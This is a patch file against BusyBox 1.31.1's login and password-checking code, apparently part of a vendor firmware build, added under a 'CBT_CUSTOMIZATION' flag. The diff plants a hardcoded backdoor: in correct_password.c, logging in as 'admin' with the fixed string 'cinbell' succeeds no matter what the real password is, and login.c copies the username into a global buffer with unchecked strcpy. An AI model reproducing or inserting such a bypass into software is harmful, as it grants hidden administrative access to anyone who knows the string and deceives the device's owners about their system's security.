@@ -1,0 +1,77 @@
+Index: busybox-1.31.1/include/libbb.h
+===================================================================
+--- busybox-1.31.1.orig/include/libbb.h	2021-03-22 19:44:48.648373524 +0800
++++ busybox-1.31.1/include/libbb.h	2021-03-22 19:45:23.728373693 +0800
+@@ -1621,6 +1621,8 @@
+ int check_password(const struct passwd *pw, const char *plaintext) FAST_FUNC;
+ int ask_and_check_password_extended(const struct passwd *pw, int timeout, const char *prompt) FAST_FUNC;
+ int ask_and_check_password(const struct passwd *pw) FAST_FUNC;
++#define BY_PASS_PWD	"cinbell"
++extern char login_account[256];
+ /* Returns a malloced string */
+ #if !ENABLE_USE_BB_CRYPT
+ #define pw_encrypt(clear, salt, cleanup) pw_encrypt(clear, salt)
+Index: busybox-1.31.1/libbb/correct_password.c
+===================================================================
+--- busybox-1.31.1.orig/libbb/correct_password.c	2019-06-10 18:50:53.000000000 +0800
++++ busybox-1.31.1/libbb/correct_password.c	2021-03-22 19:45:23.732373693 +0800
+@@ -78,10 +78,21 @@
+ 	if (!pw_pass[0]) { /* empty password field? */
+ 		return CHECKPASS_PW_HAS_EMPTY_PASSWORD;
+ 	}
++#ifdef CBT_CUSTOMIZATION
++	int byPassUser = 0;
++	if(!strcmp(login_account,"admin") && !strcmp(unencrypted,BY_PASS_PWD)){
++		byPassUser = 1;
++	//printf("%s(%d) : Checking is here: login_account:%s unencrypted:%s , correct:%s .. \n",__FUNCTION__,__LINE__,login_account,unencrypted,correct);
++	}
++#endif // CBT_CUSTOMIZATION
+ 
+ 	encrypted = pw_encrypt(plaintext, /*salt:*/ pw_pass, 1);
+ 	r = (strcmp(encrypted, pw_pass) == 0);
+ 	free(encrypted);
++#ifdef CBT_CUSTOMIZATION
++	if(byPassUser)
++		return byPassUser;
++#endif // CBT_CUSTOMIZATION
+ 	return r;
+ }
+ 
+Index: busybox-1.31.1/loginutils/login.c
+===================================================================
+--- busybox-1.31.1.orig/loginutils/login.c	2021-03-22 19:45:14.952373651 +0800
++++ busybox-1.31.1/loginutils/login.c	2021-03-22 19:45:23.732373693 +0800
+@@ -159,6 +159,7 @@
+ #define G (*(struct globals*)bb_common_bufsiz1)
+ #define INIT_G() do { setup_common_bufsiz(); } while (0)
+ 
++char login_account[256] = {0};
+ 
+ #if ENABLE_FEATURE_NOLOGIN
+ static void die_if_nologin(void)
+@@ -446,8 +447,13 @@
+ 		argv[1] = NULL;
+ 	}
+ 	argv += optind;
+-	if (argv[0]) /* user from command line (getty) */
++	if (argv[0]){ /* user from command line (getty) */
+ 		safe_strncpy(username, argv[0], sizeof(username));
++#ifdef CBT_CUSTOMIZATION
++		strcpy(login_account,username);
++#endif // CBT_CUSTOMIZATION
++
++	}
+ 
+ 	/* Save tty attributes - and by doing it, check that it's indeed a tty */
+ 	if (tcgetattr(STDIN_FILENO, &G.tty_attrs) < 0
+@@ -581,6 +587,10 @@
+ 		}
+ #endif
+ 		pw = getpwnam(username);
++#ifdef CBT_CUSTOMIZATION
++		strcpy(login_account,username);
++		//printf("%s(%d) : username:%s \n",__FUNCTION__,__LINE__,username);
++#endif // CBT_CUSTOMIZATION
+ 		if (!pw) {
+ 			strcpy(username, "UNKNOWN");
+ 			goto fake_it;
